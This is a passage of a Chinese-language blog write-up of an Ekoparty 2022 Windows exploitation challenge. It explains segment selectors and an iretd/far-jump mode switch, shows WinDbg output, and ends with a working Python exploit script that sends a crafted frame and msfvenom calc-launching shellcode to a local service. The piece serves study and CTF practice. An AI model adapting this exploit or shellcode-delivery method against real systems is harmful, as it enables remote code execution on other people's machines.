<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#6272a4">// 段选择器结构
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span><span style="color:#ff79c6">typedef</span> <span style="color:#ff79c6">struct</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd">uint16_t</span> <span style="color:#8be9fd;font-style:italic">rpl</span>  : <span style="color:#bd93f9">2</span>;  <span style="color:#6272a4">// 请求特权级别 (Request Privilege Level)
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#8be9fd">uint16_t</span> <span style="color:#8be9fd;font-style:italic">ti</span>   : <span style="color:#bd93f9">1</span>;  <span style="color:#6272a4">// 描述符表指示器 (Table Indicator, 0 for GDT, 1 for LDT)
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#8be9fd">uint16_t</span> <span style="color:#8be9fd;font-style:italic">index</span>: <span style="color:#bd93f9">13</span>; <span style="color:#6272a4">// 描述符表索引 (Descriptor Table Index)
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>} SegmentSelector;
</span></span></code></pre></div><p>cs,ss的值代表描述符在 LDT/GDT 中的偏移。</p>
<ul>
<li>TI = 0 使用GDT</li>
<li>TI = 1 使用LDT</li>
</ul>
<p>并且在 amd64 cpu下，段寄存器相对固定
- 0x00: 恒为0</p>
<ul>
<li><strong>内核模式</strong>：
<ul>
<li><code>CS</code>寄存器的值为<code>0x10</code>，对应于GDT中的<code>KERNEL_CODE_SELECTOR</code>。</li>
<li><code>SS</code> 为 <code>0x18</code></li>
</ul>
</li>
<li><strong>用户模式</strong>：
<ul>
<li><code>CS</code>寄存器的值为<code>0x33</code>，对应于GDT中的<code>USER_CODE_SELECTOR</code>，并设置RPL（请求特权级）为3。</li>
<li><code>SS</code> 为 0x28</li>
</ul>
</li>
</ul>
<p>我们得到基址就可以获得 <code>cs:ip 的值</code></p>
<p>使用IDA调试发生错误，使用WinDbgX调试</p>
<p>观察rsp</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#bd93f9">0</span><span style="color:#ff79c6">:</span><span style="color:#bd93f9">000</span><span style="color:#ff79c6">&gt;</span> dq @rsp
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">00000000</span>`<span style="color:#bd93f9">012f</span>e8d0  <span style="color:#bd93f9">00000000</span>`<span style="color:#bd93f9">00000000</span> <span style="color:#bd93f9">00000000</span>`<span style="color:#bd93f9">00000000</span>
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">00000000</span>`<span style="color:#bd93f9">012f</span>e8e0  <span style="color:#bd93f9">00000000</span>`<span style="color:#bd93f9">00000000</span> <span style="color:#bd93f9">00000000</span>`<span style="color:#bd93f9">00000000</span>
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">00000000</span>`<span style="color:#bd93f9">012f</span>e8f0  <span style="color:#bd93f9">00000f</span><span style="color:#bd93f9">02</span>`<span style="color:#bd93f9">00001000</span> <span style="color:#bd93f9">00000000</span>`<span style="color:#bd93f9">00000000</span>
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">00000000</span>`<span style="color:#bd93f9">012f</span>e900  <span style="color:#bd93f9">61616161</span>`<span style="color:#bd93f9">61616161</span> <span style="color:#bd93f9">61616161</span>`<span style="color:#bd93f9">61616161</span>
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">00000000</span>`<span style="color:#bd93f9">012f</span>e910  <span style="color:#bd93f9">61616161</span>`<span style="color:#bd93f9">61616161</span> <span style="color:#bd93f9">61616161</span>`<span style="color:#bd93f9">61616161</span>
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">00000000</span>`<span style="color:#bd93f9">012f</span>e920  <span style="color:#bd93f9">61616161</span>`<span style="color:#bd93f9">61616161</span> <span style="color:#bd93f9">61616161</span>`<span style="color:#bd93f9">61616161</span>
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">00000000</span>`<span style="color:#bd93f9">012f</span>e930  <span style="color:#bd93f9">61616161</span>`<span style="color:#bd93f9">61616161</span> <span style="color:#bd93f9">61616161</span>`<span style="color:#bd93f9">61616161</span>
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">00000000</span>`<span style="color:#bd93f9">012f</span>e940  <span style="color:#bd93f9">61616161</span>`<span style="color:#bd93f9">61616161</span> <span style="color:#bd93f9">61616161</span>`<span style="color:#bd93f9">61616161</span>
</span></span></code></pre></div><p>因此我们先让此函数执行6次 <code>pop rax</code>，在执行<code>iretd</code>（WinDbgX显示） 从而控制ss等寄存器。</p>
<p>我们程序原本的ss</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>0:<span style="color:#8be9fd;font-style:italic">000</span><span style="color:#6272a4">&gt; r ss</span>
</span></span><span style="display:flex;"><span>ss=002b
</span></span><span style="display:flex;"><span>0:<span style="color:#8be9fd;font-style:italic">000</span><span style="color:#6272a4">&gt; r cs</span>
</span></span><span style="display:flex;"><span>cs=0033
</span></span></code></pre></div><p>这里就是比较难的点，需要我们知道 x86_64下，iretd 需要pop的是x86的cs和ss。也就是寻找一个 <code>SegmentDescriptor.l = 0</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#6272a4">// dg [selector [number]]
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">0</span><span style="color:#ff79c6">:</span> kd<span style="color:#ff79c6">&gt;</span> r gdtr
</span></span><span style="display:flex;"><span>gdtr<span style="color:#ff79c6">=</span>fffff8027bb59fb0
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">0</span><span style="color:#ff79c6">:</span> kd<span style="color:#ff79c6">&gt;</span> dg <span style="color:#bd93f9">0x23</span>
</span></span><span style="display:flex;"><span>                                                    P Si Gr Pr Lo
</span></span><span style="display:flex;"><span>Sel        Base              Limit          Type    l ze an es ng Flags
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">----</span> <span style="color:#ff79c6">-----------------</span> <span style="color:#ff79c6">-----------------</span> <span style="color:#ff79c6">----------</span> <span style="color:#ff79c6">-</span> <span style="color:#ff79c6">--</span> <span style="color:#ff79c6">--</span> <span style="color:#ff79c6">--</span> <span style="color:#ff79c6">--</span> <span style="color:#ff79c6">--------</span>
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">0020</span> <span style="color:#bd93f9">00000000</span>`<span style="color:#bd93f9">00000000</span> <span style="color:#bd93f9">00000000</span>`ffffffff Code RE Ac <span style="color:#bd93f9">3</span> Bg Pg P  Nl <span style="color:#bd93f9">00000</span>cfb
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">0</span><span style="color:#ff79c6">:</span> kd<span style="color:#ff79c6">&gt;</span> dq fffff8027bb59fb0<span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x20</span>
</span></span><span style="display:flex;"><span>fffff802`<span style="color:#bd93f9">7</span>bb59fd0  <span style="color:#bd93f9">00</span>cffb00`<span style="color:#bd93f9">0000ff</span>ff <span style="color:#bd93f9">00</span>cff300`<span style="color:#bd93f9">0000ff</span>ff
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">0</span><span style="color:#ff79c6">:</span> kd<span style="color:#ff79c6">&gt;</span> .formats <span style="color:#bd93f9">00</span>cffb00`<span style="color:#bd93f9">0000ff</span>ff
</span></span><span style="display:flex;"><span>Evaluate <span style="color:#8be9fd;font-style:italic">expression</span>:
</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd;font-style:italic">Hex</span>:     <span style="color:#bd93f9">00</span>cffb00`<span style="color:#bd93f9">0000ff</span>ff
</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd;font-style:italic">Decimal</span>: <span style="color:#bd93f9">58541297597743103</span>
</span></span><span style="display:flex;"><span>  Decimal (<span style="color:#8be9fd">unsigned</span>) <span style="color:#ff79c6">:</span> <span style="color:#bd93f9">58541297597743103</span>
</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd;font-style:italic">Octal</span>:   <span style="color:#bd93f9">0003177660000000177777</span>
</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd;font-style:italic">Binary</span>:  <span style="color:#bd93f9">00000000</span> <span style="color:#bd93f9">11001111</span> <span style="color:#bd93f9">11111011</span> <span style="color:#bd93f9">00000000</span> <span style="color:#bd93f9">00000000</span> <span style="color:#bd93f9">00000000</span> <span style="color:#bd93f9">11111111</span> <span style="color:#bd93f9">11111111</span>
</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd;font-style:italic">Chars</span>:   ........
</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd;font-style:italic">Time</span>:    Thu Jul  <span style="color:#bd93f9">6</span> <span style="color:#bd93f9">11</span><span style="color:#ff79c6">:</span><span style="color:#bd93f9">09</span><span style="color:#ff79c6">:</span><span style="color:#bd93f9">19.774</span> <span style="color:#bd93f9">1786</span> (UTC <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">8</span><span style="color:#ff79c6">:</span><span style="color:#bd93f9">00</span>)
</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd;font-style:italic">Float</span>:   low <span style="color:#bd93f9">9.18341e-041</span> high <span style="color:#bd93f9">1.91e-038</span>
</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd;font-style:italic">Double</span>:  <span style="color:#bd93f9">9.10834e-305</span>
</span></span></code></pre></div><p>观察 <code>l</code> 位为0，代表为32位。同理找到 <code>0x53</code> data segment</p>
<ul>
<li>参考：<a href="https://www.malwaretech.com/2014/02/the-0x33-segment-selector-heavens-gate.html">The 0x33 Segment Selector</a></li>
</ul>
<p>eflags可以直接调试得出，可以不改变</p>
<p>iretd 会转化一次架构位为x86架构，我们生成的shellcode为x64，再次转化架构也就是 <code>jmp cs:ip</code> 执行再次转化</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff79c6">import</span> socket
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> struct
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">p64</span>(v):
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> struct<span style="color:#ff79c6">.</span>pack(<span style="color:#f1fa8c">&#34;&lt;Q&#34;</span>, v)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">p32</span>(v):
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> struct<span style="color:#ff79c6">.</span>pack(<span style="color:#f1fa8c">&#34;&lt;I&#34;</span>, v)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">p16</span>(v):
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> struct<span style="color:#ff79c6">.</span>pack(<span style="color:#f1fa8c">&#34;&lt;H&#34;</span>, v)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4"># addr = &#34;192.168.85.128&#34;</span>
</span></span><span style="display:flex;"><span>addr <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;127.0.0.1&#34;</span>
</span></span><span style="display:flex;"><span>port <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">31415</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>conn <span style="color:#ff79c6">=</span> socket<span style="color:#ff79c6">.</span>socket(socket<span style="color:#ff79c6">.</span>AF_INET, socket<span style="color:#ff79c6">.</span>SOCK_STREAM)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>conn<span style="color:#ff79c6">.</span>connect((addr, port))
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">if</span> <span style="color:#ff79c6">not</span> conn:
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#34;[-] Error connect&#34;</span>)
</span></span><span style="display:flex;"><span>    exit(<span style="color:#bd93f9">1</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;Hello</span><span style="color:#f1fa8c">\x00</span><span style="color:#f1fa8c">&#34;</span>
</span></span><span style="display:flex;"><span>conn<span style="color:#ff79c6">.</span>send(payload)
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">print</span>(conn<span style="color:#ff79c6">.</span>recv(<span style="color:#bd93f9">3</span>))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f1fa8c">&#34;&#34;&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">RIP|CS|RFLAGS|SP|SS
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">&#34;&#34;&#34;</span>
</span></span><span style="display:flex;"><span>ctx <span style="color:#ff79c6">=</span> p32(<span style="color:#bd93f9">0x10000014</span>) <span style="color:#ff79c6">+</span> p32(<span style="color:#bd93f9">0x23</span>) <span style="color:#ff79c6">+</span> p32(<span style="color:#bd93f9">0x202</span>) <span style="color:#ff79c6">+</span> p32(<span style="color:#bd93f9">0x10000000</span>) <span style="color:#ff79c6">+</span> p32(<span style="color:#bd93f9">0x53</span>) 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4"># msfvenom -a x64 --platform Windows -p windows/x64/exec cmd=&#34;calc&#34; -f python -v shellcode</span>
</span></span><span style="display:flex;"><span>shellcode <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;&#34;</span>
</span></span><span style="display:flex;"><span>shellcode <span style="color:#ff79c6">+=</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41</span><span style="color:#f1fa8c">&#34;</span>
</span></span><span style="display:flex;"><span>shellcode <span style="color:#ff79c6">+=</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48</span><span style="color:#f1fa8c">&#34;</span>
</span></span><span style="display:flex;"><span>shellcode <span style="color:#ff79c6">+=</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20</span><span style="color:#f1fa8c">&#34;</span>
</span></span><span style="display:flex;"><span>shellcode <span style="color:#ff79c6">+=</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31</span><span style="color:#f1fa8c">&#34;</span>
</span></span><span style="display:flex;"><span>shellcode <span style="color:#ff79c6">+=</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20</span><span style="color:#f1fa8c">&#34;</span>
</span></span><span style="display:flex;"><span>shellcode <span style="color:#ff79c6">+=</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41</span><span style="color:#f1fa8c">&#34;</span>
</span></span><span style="display:flex;"><span>shellcode <span style="color:#ff79c6">+=</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0</span><span style="color:#f1fa8c">&#34;</span>
</span></span><span style="display:flex;"><span>shellcode <span style="color:#ff79c6">+=</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67</span><span style="color:#f1fa8c">&#34;</span>
</span></span><span style="display:flex;"><span>shellcode <span style="color:#ff79c6">+=</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20</span><span style="color:#f1fa8c">&#34;</span>
</span></span><span style="display:flex;"><span>shellcode <span style="color:#ff79c6">+=</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34</span><span style="color:#f1fa8c">&#34;</span>
</span></span><span style="display:flex;"><span>shellcode <span style="color:#ff79c6">+=</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac</span><span style="color:#f1fa8c">&#34;</span>
</span></span><span style="display:flex;"><span>shellcode <span style="color:#ff79c6">+=</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1</span><span style="color:#f1fa8c">&#34;</span>
</span></span><span style="display:flex;"><span>shellcode <span style="color:#ff79c6">+=</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58</span><span style="color:#f1fa8c">&#34;</span>
</span></span><span style="display:flex;"><span>shellcode <span style="color:#ff79c6">+=</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c</span><span style="color:#f1fa8c">&#34;</span>
</span></span><span style="display:flex;"><span>shellcode <span style="color:#ff79c6">+=</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04</span><span style="color:#f1fa8c">&#34;</span>
</span></span><span style="display:flex;"><span>shellcode <span style="color:#ff79c6">+=</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a</span><span style="color:#f1fa8c">&#34;</span>
</span></span><span style="display:flex;"><span>shellcode <span style="color:#ff79c6">+=</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41</span><span style="color:#f1fa8c">&#34;</span>
</span></span><span style="display:flex;"><span>shellcode <span style="color:#ff79c6">+=</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9</span><span style="color:#f1fa8c">&#34;</span>
</span></span><span style="display:flex;"><span>shellcode <span style="color:#ff79c6">+=</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00</span><span style="color:#f1fa8c">&#34;</span>
</span></span><span style="display:flex;"><span>shellcode <span style="color:#ff79c6">+=</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\x00\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00</span><span style="color:#f1fa8c">&#34;</span>
</span></span><span style="display:flex;"><span>shellcode <span style="color:#ff79c6">+=</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\x41\xba\x31\x8b\x6f\x87\xff\xd5\xbb\xf0\xb5</span><span style="color:#f1fa8c">&#34;</span>
</span></span><span style="display:flex;"><span>shellcode <span style="color:#ff79c6">+=</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5\x48</span><span style="color:#f1fa8c">&#34;</span>
</span></span><span style="display:flex;"><span>shellcode <span style="color:#ff79c6">+=</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75</span><span style="color:#f1fa8c">&#34;</span>
</span></span><span style="display:flex;"><span>shellcode <span style="color:#ff79c6">+=</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89</span><span style="color:#f1fa8c">&#34;</span>
</span></span><span style="display:flex;"><span>shellcode <span style="color:#ff79c6">+=</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\xda\xff\xd5\x63\x61\x6c\x63\x00</span><span style="color:#f1fa8c">&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f1fa8c">&#39;&#39;&#39;
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">&gt;&gt;&gt; asm(&#34;JMP 0x33:0x1000001c&#34;)
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">b&#39;</span><span style="color:#f1fa8c">\xea\x1c\x00\x00\x10</span><span style="color:#f1fa8c">3</span><span style="color:#f1fa8c">\x00</span><span style="color:#f1fa8c">&#39;
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">&#39;&#39;&#39;</span>
</span></span><span style="display:flex;"><span>jmp_shellcode <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#39;</span><span style="color:#f1fa8c">\xea\x1c\x00\x00\x10</span><span style="color:#f1fa8c">3</span><span style="color:#f1fa8c">\x00</span><span style="color:#f1fa8c">&#39;</span> <span style="color:#6272a4"># JMP 0x33:0x1000001c</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f1fa8c">&#39;&#39;&#39;
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">&gt;&gt;&gt; asm(&#34;mov rsp, rcx&#34;)
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">b&#39;H</span><span style="color:#f1fa8c">\x89\xcc</span><span style="color:#f1fa8c">&#39;
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">&#39;&#39;&#39;</span>
</span></span><span style="display:flex;"><span>origin_rsp <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#39;H</span><span style="color:#f1fa8c">\x89\xcc</span><span style="color:#f1fa8c">&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>padding <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\x90</span><span style="color:#f1fa8c">&#34;</span> <span style="color:#ff79c6">*</span> <span style="color:#bd93f9">7</span>
</span></span><span style="display:flex;"><span>header <span style="color:#ff79c6">=</span> p64(<span style="color:#bd93f9">0x323230326F6B45</span>)
</span></span><span style="display:flex;"><span>header <span style="color:#ff79c6">+=</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;T&#34;</span>
</span></span><span style="display:flex;"><span>header <span style="color:#ff79c6">+=</span> p16(<span style="color:#bd93f9">0x8000</span>)
</span></span><span style="display:flex;"><span>data <span style="color:#ff79c6">=</span> ctx
</span></span><span style="display:flex;"><span>data <span style="color:#ff79c6">+=</span> jmp_shellcode <span style="color:#ff79c6">+</span> origin_rsp
</span></span><span style="display:flex;"><span>data <span style="color:#ff79c6">+=</span> shellcode
</span></span><span style="display:flex;"><span>data <span style="color:#ff79c6">+=</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\x90</span><span style="color:#f1fa8c">&#34;</span> <span style="color:#ff79c6">*</span> (<span style="color:#bd93f9">0xF00</span> <span style="color:#ff79c6">-</span> <span style="color:#8be9fd;font-style:italic">len</span>(data))
</span></span><span style="display:flex;"><span>data <span style="color:#ff79c6">+=</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;X&#34;</span> <span style="color:#ff79c6">+</span> padding
</span></span><span style="display:flex;"><span>conn<span style="color:#ff79c6">.</span>send(header <span style="color:#ff79c6">+</span> data)
</span></span></code></pre></div><p>第一次接触到段寄存器这种玩法，狠狠的学习了😤</p>
<h2 id="参考">参考</h2>
<ul>
<li><a href="https://infosecwriteups.com/bfs-ekoparty-2022-exploitation-challenges-7deffce64ee4">BFS Ekoparty 2022 Exploitation Challenges</a></li>
</ul>
		</section>

		<div class="post-tags">
			
			
			<nav class="nav tags">
				<ul class="tags">
					
					<li><a href="/tags/windows">Windows</a></li>
					
				</ul>
			</nav>
			
			
		</div>
		<div id="disqus_thread"></div>
<script type="text/javascript">
    (function () {
        
        
        if (window.location.hostname == "localhost")
            return;

        var dsq = document.createElement('script');
        dsq.type = 'text/javascript';
        dsq.async = true;
        var disqus_shortname = 'ldrx30';
        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
    })();
</script>

</article>
</main>
<footer>
  <div style="display:flex"><a class="soc" href="https://github.com/ldrx30" rel="me" title="GitHub"><i data-feather="github"></i></a>
    <a class="border"></a></div>
  <div class="footer-info">
    2024  © ldrx30 |  <a
      href="https://github.com/athul/archie">Archie Theme</a> | Built with <a href="https://gohugo.io">Hugo</a>
  </div>
</footer>
<script>
  feather.replace()
</script></div>
    </body>
</html>
